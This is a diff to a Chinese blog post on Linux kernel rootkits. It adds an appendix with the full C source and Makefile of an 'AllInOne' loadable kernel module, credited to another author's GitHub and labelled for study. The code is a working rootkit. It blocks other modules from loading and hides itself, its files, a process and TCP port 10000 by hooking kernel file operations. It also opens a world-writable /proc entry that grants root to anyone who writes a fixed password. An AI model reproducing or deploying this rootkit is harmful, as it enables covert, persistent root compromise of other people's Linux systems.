@@ -230,7 +230,7 @@ if(real_seq_show){
 
 ### All In One
 
-最后，我们把所有功能聚合到一个程序中进行过如下测试。源代码可以从[这里]({{ site.url }}/resources/code/AllInOne.tar.bz2)下载。代码主要来自 novice 师傅的 Github，经过我的修改和整理，供学习研究参考使用。
+最后，我们把所有功能聚合到一个程序中进行过如下测试。源代码见附录。代码主要来自 novice 师傅的 Github，经过我的修改和整理，供学习研究参考使用。
 
 1. 自身加载后禁止其他模块加载
 2. 隐藏自身模块
@@ -278,3 +278,371 @@ if(real_seq_show){
 
 - [mncoppola/suterusu: An LKM rootkit targeting Linux 2.6/3.x on x86(_64), and ARM ](https://github.com/mncoppola/suterusu)
 - [Suterusu Rootkit: Inline Kernel Function Hooking on x86 and ARM](https://poppopret.org/2013/01/07/suterusu-rootkit-inline-kernel-function-hooking-on-x86-and-arm/)
+
+## 附录
+
+### AllInOne.c
+
+```c
+//---------------------- include ->
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <asm/uaccess.h>
+#include <linux/cred.h>
+#include <linux/sched.h>
+#include <linux/slab.h>
+#include <linux/seq_file.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <net/tcp.h>
+
+MODULE_LICENSE("GPL");
+
+#define NAME "yessir"
+
+void disable_write_protection(void){
+	unsigned long cr0 = read_cr0();
+	clear_bit(16, &cr0);
+	write_cr0(cr0);
+}
+
+void enable_write_protection(void){
+	unsigned long cr0 = read_cr0();
+	set_bit(16, &cr0);
+	write_cr0(cr0);
+}
+
+#define set_f_op(op, path, new, old)	\
+	do{									\
+		struct file *filp;				\
+		struct file_operations *f_op;	\
+		filp = filp_open(path, O_RDONLY, 0);		\
+		if(IS_ERR(filp)){							\
+			old = NULL;										\
+		}													\
+		else{												\
+			f_op = (struct file_operations *)filp->f_op;	\
+			old = f_op->op;									\
+			disable_write_protection();						\
+			f_op->op = new;									\
+			enable_write_protection();						\
+		}													\
+	}while(0)
+
+//---------------------- block other module ->
+int module_notifier(struct notifier_block *nb, \
+					unsigned long action, void *data);
+struct notifier_block nb = {
+	.notifier_call = module_notifier,
+	.priority = INT_MAX
+};
+
+int fake_init(void);
+void fake_exit(void);
+
+int module_notifier(struct notifier_block *nb, \
+					unsigned long action, void *data){
+	struct module *module;
+	unsigned long flags;
+	// definite lock
+	DEFINE_SPINLOCK(module_notifier_spinlock);
+	module = data;
+
+	// store interrupt, lock
+	spin_lock_irqsave(&module_notifier_spinlock, flags);
+	switch(module->state){
+	case MODULE_STATE_COMING:
+		module->init = fake_init;
+		module->exit = fake_exit;
+		break;
+	default:
+		break;
+	}
+	spin_unlock_irqrestore(&module_notifier_spinlock, flags);
+	return NOTIFY_DONE;
+}
+
+int fake_init(void){
+	return 0;
+}
+
+void fake_exit(void){
+	return;
+}
+
+//---------------------- hide self module ->
+#define SYS_MODULE_PATH	"/sys/module"
+#define PROC_MODULE_PATH	"/proc/modules"
+#define SECRET_MODULE		"AllInOne"
+
+int (*real_iterate_1)(struct file *, struct dir_context *);
+int (*real_filldir_1)(struct dir_context *, const char *, int, \
+					loff_t, u64, unsigned);
+
+
+int fake_filldir_1(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type);
+
+int fake_iterate_1(struct file *filp, struct dir_context *ctx){
+	real_filldir_1 = ctx->actor;
+	*(filldir_t *)&ctx->actor = fake_filldir_1;
+
+	return real_iterate_1(filp, ctx);
+}
+int fake_filldir_1(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type){
+	if(strncmp(name, SECRET_MODULE, strlen(SECRET_MODULE)) == 0){
+		return 0;
+	}
+
+	return real_filldir_1(ctx, name, namlen, offset, ino, d_type);
+}
+
+#define set_file_seq_op_1(opname, path, new, old)	\
+	do{	\
+		struct file *filp;	\
+		struct seq_file *seq;	\
+		struct seq_operations	*seq_op;	\
+		filp = filp_open(path, O_RDONLY, 0);	\
+		if(IS_ERR(filp)){	\
+			old = NULL;	\
+		}	\
+		else{	\
+			seq = (struct seq_file *)filp->private_data;	\
+			seq_op = (struct seq_operations *)seq->op;	\
+			old = seq_op->opname;	\
+			disable_write_protection();	\
+			seq_op->opname = new;	\
+			enable_write_protection();	\
+		}	\
+	}while(0)
+
+int (*real_seq_show_1)(struct seq_file *seq, void *v);
+
+int fake_seq_show_1(struct seq_file *seq, void *v){
+	int ret;
+	size_t last_count, last_size;
+	
+	last_count = seq->count;
+	ret = real_seq_show_1(seq, v);
+
+	last_size = seq->count - last_count;
+
+	if(strnstr(seq->buf + seq->count - last_size, SECRET_MODULE, \
+				last_size)){
+		seq->count -= last_size;
+	}
+
+	return ret;
+}
+
+//---------------------- hide AllInOne.ko ->
+#define SECRET_FILE	"AllInOne"
+#define ROOT_PATH	"/"
+
+int (*real_iterate_2)(struct file *, struct dir_context *);
+int (*real_filldir_2)(struct dir_context *, const char *, int, \
+					loff_t, u64, unsigned);
+
+int fake_filldir_2(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type);
+
+int fake_iterate_2(struct file *filp, struct dir_context *ctx){
+	real_filldir_2 = ctx->actor;
+	*(filldir_t *)&ctx->actor = fake_filldir_2;
+
+	return real_iterate_2(filp, ctx);
+}
+
+int fake_filldir_2(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type){
+	if(strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0){
+		return 0;
+	}
+
+	return real_filldir_2(ctx, name, namlen, offset, ino, d_type);
+}
+
+//---------------------- hide process ->
+#define PROC_PATH	"/proc"
+#define SECRET_PROC	1
+int (*real_iterate_3)(struct file *, struct dir_context *);
+int (*real_filldir_3)(struct dir_context *, const char *, int, \
+					loff_t, u64, unsigned);
+int fake_filldir_3(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type);
+
+int fake_iterate_3(struct file *filp, struct dir_context *ctx){
+	real_filldir_3 = ctx->actor;
+	*(filldir_t *)&ctx->actor = fake_filldir_3;
+
+	return real_iterate_3(filp, ctx);
+}
+
+int fake_filldir_3(struct dir_context *ctx, const char *name, int namlen, \
+				loff_t offset, u64 ino, unsigned d_type){
+	char *endp;
+	long pid;
+	if(strncmp(name, NAME, strlen(NAME)) == 0){
+		return 0;
+	}
+	pid = simple_strtol(name, &endp, 10);
+	if(pid == SECRET_PROC){
+		return 0;
+	}
+	return real_filldir_3(ctx, name, namlen, offset, ino, d_type);
+}
+
+//---------------------- hide port ->
+#define NET_ENTRY "/proc/net/tcp"
+#define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
+#define NEEDLE_LEN	6
+#define SECRET_PORT	10000
+#define TMPSZ	150
+#define set_afinfo_seq_op(op, path, afinfo_struct, new, old)	\
+	do{	\
+		struct file *filp;	\
+		afinfo_struct *afinfo;	\
+		filp = filp_open(path, O_RDONLY, 0);	\
+		if(IS_ERR(filp)){	\
+			old = NULL;	\
+		}	\
+		else{	\
+				afinfo = PDE_DATA(filp->f_path.dentry->d_inode);	\
+				old = afinfo->seq_ops.op;	\
+				afinfo->seq_ops.op = new;	\
+				filp_close(filp, 0);	\
+		}	\
+	}while(0)
+
+int (*real_seq_show_4)(struct seq_file *seq, void *v);
+
+int fake_seq_show_4(struct seq_file *seq, void *v){
+	int ret;
+	char needle[NEEDLE_LEN];
+	snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
+	ret = real_seq_show_4(seq, v);
+
+	if(strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)){
+		seq->count -= TMPSZ;
+	}
+	return ret;
+}
+
+//---------------------- root backdoor ->
+#define AUTH "00100011F"
+
+struct proc_dir_entry *entry;
+
+ssize_t write_handler(struct file *filp, const char __user *buff, size_t count, loff_t *offp){
+	char *kbuff;
+	struct cred* cred;
+	kbuff = kmalloc(count + 1, GFP_KERNEL);
+	if(!kbuff){
+		return -ENOMEM;
+	}
+
+	if(copy_from_user(kbuff, buff, count)){
+		kfree(kbuff);
+		return -EFAULT;
+	}
+	kbuff[count] = (char)0;
+	if(strlen(kbuff) == strlen(AUTH) && \
+		strncmp(AUTH, kbuff, count) == 0){
+		cred = (struct cred *)__task_cred(current);
+		cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
+		cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
+		
+	}
+	else{
+	}
+
+	kfree(kbuff);
+	return count;
+}
+
+struct file_operations proc_fops = {
+	.write = write_handler
+};
+
+//---------------------- init/exit ->
+static int lkm_init(void){
+//---------------------- block other module ->
+	register_module_notifier(&nb);
+//---------------------- hide self module ->
+	set_f_op(iterate, SYS_MODULE_PATH, fake_iterate_1, real_iterate_1);
+	set_file_seq_op_1(show, PROC_MODULE_PATH, fake_seq_show_1, real_seq_show_1);
+	if(!real_iterate_1){
+		return -ENOENT;
+	}
+//---------------------- hide AllInOne.ko ->
+	set_f_op(iterate, ROOT_PATH, fake_iterate_2, real_iterate_2);
+	if(!real_iterate_2){
+		return -ENOENT;
+	}
+//---------------------- hide process ->
+	set_f_op(iterate, PROC_PATH, fake_iterate_3, real_iterate_3);
+	if(!real_iterate_3){
+		return -ENOENT;}
+//---------------------- hide port ->
+	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, fake_seq_show_4, real_seq_show_4);
+//---------------------- root backdoor ->
+	entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
+
+    return 0;
+}
+
+static void lkm_exit(void){
+//---------------------- block other module ->
+	unregister_module_notifier(&nb);
+//---------------------- hide self module ->
+	if(real_iterate_1){
+		void *dummy;
+		set_f_op(iterate, SYS_MODULE_PATH, real_iterate_1, dummy);
+	}
+	if(real_seq_show_1){
+		void *dummy;
+		set_file_seq_op_1(show, PROC_MODULE_PATH, real_seq_show_1, dummy);
+	}
+//---------------------- hide AllInOne.ko ->
+	if(real_iterate_2){
+		void *dummy;
+		set_f_op(iterate, ROOT_PATH, real_iterate_2, dummy);
+	}
+//---------------------- hide process ->
+	if(real_iterate_3){
+		void *dummy;
+		set_f_op(iterate, PROC_PATH, real_iterate_3, dummy);
+	}
+//---------------------- hide port ->
+	if(real_seq_show_4){
+		void *dummy;
+		set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, real_seq_show_4, dummy);
+	}
+//---------------------- root backdoor ->
+	proc_remove(entry);
+
+	return;
+}
+
+module_init(lkm_init);
+module_exit(lkm_exit);
+```
+
+### Makefile
+
+```makefile
+obj-m := AllInOne.o
+
+KDIR := /lib/modules/$(shell uname -r)/build
+PWD := $(shell pwd)
+
+default:
+	$(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+clean:
+	${MAKE} clean \
+                --directory "/lib/modules/$(shell uname --release)/build" \
+M="$(shell pwd)"
+```
